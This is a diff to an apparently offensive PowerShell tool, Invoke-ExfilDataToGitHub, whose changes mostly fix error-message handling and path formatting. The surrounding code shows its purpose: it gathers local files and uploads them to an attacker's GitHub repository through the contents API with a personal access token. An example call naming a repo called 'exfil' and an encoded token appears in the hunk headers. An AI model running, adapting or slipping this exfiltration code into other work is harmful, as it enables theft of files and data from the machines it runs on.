@@ -70,7 +70,7 @@ Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3Mz
 
         [Parameter(Position = 2, Mandatory = $True)]
         [String]
-        $GHPAT, # This should be base 64 encoded
+        $GHPAT, # This should be base64 encoded
 
         [Parameter(Position =3, Mandatory = $True)]
         [String]
@@ -121,6 +121,9 @@ Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3Mz
 if ($PsCmdlet.ParameterSetName -eq "ExfilDataToFile")
 {
 
+    # Make sure filepaths are in correct format
+    if ($GHFilePath[-1] -ne "/") { $GHFilePath += "/" }
+
     # Before deleting or inserting check to see if the file exists, if it does then get the sha and delete the file first
     $GHAPI = "https://api.github.com/repos/" + $GHUser + "/" + $GHRepo + "/contents/" + $GHFilePath + $GHFileName
 
@@ -137,8 +140,8 @@ if ($PsCmdlet.ParameterSetName -eq "ExfilDataToFile")
         
     }
     Catch {        
-        $ErrorMessage = $_.Exception.Message;
-        Write-Error "Trying to get file contents: " + $ErrorMessage; 
+        $ErrorMessage = "Trying to get file contents: " + $_.Exception.Message;
+        Write-Error $ErrorMessage; 
     }
 
    
@@ -158,8 +161,8 @@ if ($PsCmdlet.ParameterSetName -eq "ExfilDataToFile")
             Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Delete -ErrorAction SilentlyContinue
         }
         catch{
-            $ErrorMessage = $_.Exception.Message;
-            Write-Error "Trying to delete file: " + $ErrorMessage; 
+            $ErrorMessage = "Trying to delete file: " + $_.Exception.Message;
+            Write-Error $ErrorMessage; 
         }
     } 
 
@@ -175,8 +178,8 @@ if ($PsCmdlet.ParameterSetName -eq "ExfilDataToFile")
             $content = Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Put -ErrorAction SilentlyContinue
         }
         catch{
-            $ErrorMessage = $_.Exception.Message;
-            Write-Error "Trying to create file: " + $ErrorMessage;
+            $ErrorMessage = "Trying to create file: " + $_.Exception.Message;
+            Write-Error $ErrorMessage;
            
         }    
 
@@ -198,7 +201,6 @@ if ($PsCmdlet.ParameterSetName -eq "ExfilFilesFromFilePath")
     # Make sure filepaths are in correct format
     if ($GHFilePath[-1] -ne "/") { $GHFilePath += "/" }
     if ($LocalFilePath[-1] -ne "\") { $LocalFilePath += "\" }
-
 
     # Get the collection of files from the filter
     $Files = @()
@@ -237,8 +239,8 @@ if ($PsCmdlet.ParameterSetName -eq "ExfilFilesFromFilePath")
                 $sha = $content.sha
             }
             Catch {      
-                $ErrorMessage = $_.Exception.Message;
-                Write-Error "Trying to get file contents: " + $ErrorMessage;
+                $ErrorMessage = "Trying to get file contents: " + $_.Exception.Message;
+                Write-Error $ErrorMessage;
             }
 
             # Delete the file if it already exists
@@ -254,8 +256,8 @@ if ($PsCmdlet.ParameterSetName -eq "ExfilFilesFromFilePath")
                     Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Delete -ErrorAction SilentlyContinue
                 }
                 catch{
-                    $ErrorMessage = $_.Exception.Message;
-                    Write-Error "Trying to delete file: " + $ErrorMessage;
+                    $ErrorMessage = "Trying to delete file: " + $_.Exception.Message;
+                    Write-Error $ErrorMessage;
                 }
             } 
 
@@ -273,19 +275,24 @@ if ($PsCmdlet.ParameterSetName -eq "ExfilFilesFromFilePath")
                 message = "Commit at: " + (Get-Date);
             } | ConvertTo-Json
             
-            $content = Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Put -ErrorAction SilentlyContinue
+            $content = Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Put -ErrorAction SilentlyContinue | Write-Output
             
 
         }
         Catch {
-            $ErrorMessage = $_.Exception.Message;
-            Write-Error "Trying to upload file " + $file.FullName + " :" + $ErrorMessage
+            $ErrorMessage = "Trying to upload file " + $file.FullName + " :" + $_.Exception.Message;
+            Write-Error $ErrorMessage
             
         }
 
     }
    
 }
+
+#endregion
+
+}
+
 
 #endregion
 
